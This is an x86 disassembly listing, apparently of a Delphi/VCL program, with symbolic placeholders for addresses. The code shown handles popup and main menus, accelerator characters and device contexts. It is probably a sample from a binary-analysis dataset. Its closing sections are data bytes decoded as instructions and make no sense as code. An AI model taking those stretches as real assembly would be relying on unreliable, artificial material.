mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404094
mov eax [ ebp - 0xc ]
pop edx
call sub_407b0c
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_4480e0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447370
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403ed0
retn
sub_44737c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_447238
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_447294
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_4474f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_446c00
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_446a7c
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_446a7c
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408320
mov eax [ ebp + 0x10 ]
call sub_408264
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_4475c0
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_430850
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44759c
mov [ ebx + 0x41 ] 0x1
sub_4475e8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032a0
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44759c
mov [ ebx + 0x41 ] 0x1
sub_447674
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_447170
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_446ff8
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_447704
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_447740
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403578#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44778c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_447cbf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447cc6
lea eax [ ebp - 0x30 ]
call sub_403eac
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413860
mov edx [ esi + 0x4 ]
call sub_446b38
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_453b7c
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413860
mov dx [ esi + 0x4 ]
call sub_446b1c
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d474
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_447af2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_447ad5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41db5c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41d9fc
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_447f64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447adc
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41db5c
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_44737c
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_446a7c
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413860
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_446a7c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_447c35
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d474
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_447c10
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_447bf3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_41db5c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41d9fc
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447bfa
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41db5c
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_430ad4
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_453b7c
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413860
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_446a7c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413860
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_446a7c
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413860
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413860
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_446a7c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413860
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413860
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_446aac
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413860
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413860
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_446aac
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_453820
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_453888
jmp r-xdata
sub_447c17
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_447cd0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_413704
pop esi
pop ebx
retn
push ebx
push sub_447740
call sub_41ac58
mov [ ebx + 0x10 ] eax
sub_447d14
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_446894
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_447cd0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_447d88
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_447cf8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_446930
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_447de0
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_442c2c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_44759c
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44759c
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_447e28
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_442c2c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4523cc
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_4032ec
mov edx eax
jmp r-xdata
sub_447e74
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_412404
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_447de0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_4461e8
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_4466e4
mov eax [ ebx + 0x34 ]
call sub_443a8c
mov eax ebx
call sub_44708c
mov eax ebx
call sub_447e28
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_443bbc
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_447f28
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413860
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413860
cmp ebp [ eax ]
jne r-xdata
sub_447f64
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41d324
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_41cb58
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_41d324
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_41cb58
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_4032ec
mov edx [ r-xdata ]
call sub_40327c
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41d324
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_41cb58
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_44804c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403f00
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_40416c
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_40440c
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_40416c
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_40440c
jmp r-xdata
sub_4480e0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403eac
mov ebx 0x1
mov eax esi
call sub_40416c
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404094
sub_448144
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44819d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44804c
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44804c
mov eax [ ebp - 0x8 ]
pop edx
call sub_407b44
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4481a4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed0
retn
sub_4481ac
adc al [ eax ]
add [ eax ] al
xor al 0x6c
inc esi
add [ eax + 0x30004676 ] al
insb
inc esi
add [ eax ] cl
jbe r-xdata
jbe r-xdata
add [ esp + ebp * 2 ] ch
inc esi
add [ ebp + esi * 2 + 0x6c280046 ] al
inc esi
add al bl
jne r-xdata
xor [ ecx + ecx * 4 + 0x20 ] ah
add [ eax ] cl
insb
inc esi
add al ah
jpe r-xdata
jpe r-xdata
add [ esp + ebp * 2 ] ah
inc esi
add [ edx + edi * 2 + 0x6c200046 ] al
inc esi
add al ah
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4482ab
retn
mov eax [ rw-data ]
call sub_4030f0
mov eax [ rw-data ]
inc esi
add [ ebp + 0x3d ] dh
add [ esp + ebp * 2 ] al
inc esi
add [ edx + edi * 2 + 0x6c000046 ] cl
call sub_4030f0
add al ch
lea ebp [ esi - 0x5b5e0005 ]
mov eax [ esi ]
inc esi
add [ ebx + edi * 2 + 0x6bfc0046 ] dh
inc esi
add [ eax + 0x7b ] dh
inc esi
add [ eax ] al
insb
jpo r-xdata
add [ esp + ebp * 2 ] bl
inc esi
add [ eax + 0x78 ] cl
inc esi
add [ eax ] bl
insb
inc esi
add [ eax + 0x77 ] dh
inc esi
add [ esp + ebp * 2 ] dl
inc esi
add [ ebx + edi * 2 + 0x46 ] al
add [ eax ] dl
insb
inc esi
add [ eax + 0x7b ] al
inc esi
add [ esp + ebp * 2 ] cl
inc esi
add al dh
sti
add ah dh
imul eax [ esi ] 0x20
ja r-xdata
mov eax [ rw-data ]
call sub_4030f0
mov eax rw-data
mov ecx 0x12
add al bh
imul eax [ esi ] 0x8
ja r-xdata
mov edx [ r-xdata ]
call sub_404928
mov eax rw-data
call sub_403eac
adc al [ eax ]
add [ eax ] al
add al dh
imul eax [ esi ] 0xffffff9c
ja r-xdata
inc eax
add al ch
pushfd
inc [ rw-data ]
jne r-xdata
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4482a4
push [ fs : eax ]
mov [ fs : eax ] esp
sub_4482b0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4481ac
call sub_403bd4
mov eax [ r-xdata ]
call sub_41309c
mov eax [ r-xdata ]
call sub_41313c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4130e8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4130e8
mov eax [ r-xdata ]
call sub_412fe0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4226dc
mov [ rw-data ] eax
sub_4483dc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
test [ eax + eax ] al
inc [ ecx ]
add [ 0x6f6c6f43 ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax + 0x8 ] 0x0
add bh bh
or [ eax ] al
add bh bh
or al 0xa7
inc esp
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
jb r-xdata
ror [ eax - 0x7c ] 0x44
add [ edi ] al
add [ eax ] al
je r-xdata
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
push esp
inc ebx
outsd
outsb
je r-xdata
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x8 ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
inc esp
add [ eax ] cl
ja r-xdata
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
push [ edi + ebp * 4 + 0x44 ]
outsd
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
call [ esi + ebp * 4 + 0x44 ]
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
dec eax
test [ eax + eax + 0x7 ] al
jae r-xdata
add [ eax ] 0x0
add [ eax ] al
test [ eax + eax + 0x68 ] al
adc eax 0xd0041
add eax 0x6d726f46
jae r-xdata
lodsb [ esi ]
inc ebx
dec esi
outsd
jb r-xdata
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add al ch
jl r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esi + eax * 4 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] al
[ 0x1ff0000 ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
push [ eax ]
scasd [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
je r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add [ eax ] al
add ah dh
adc al 0x41
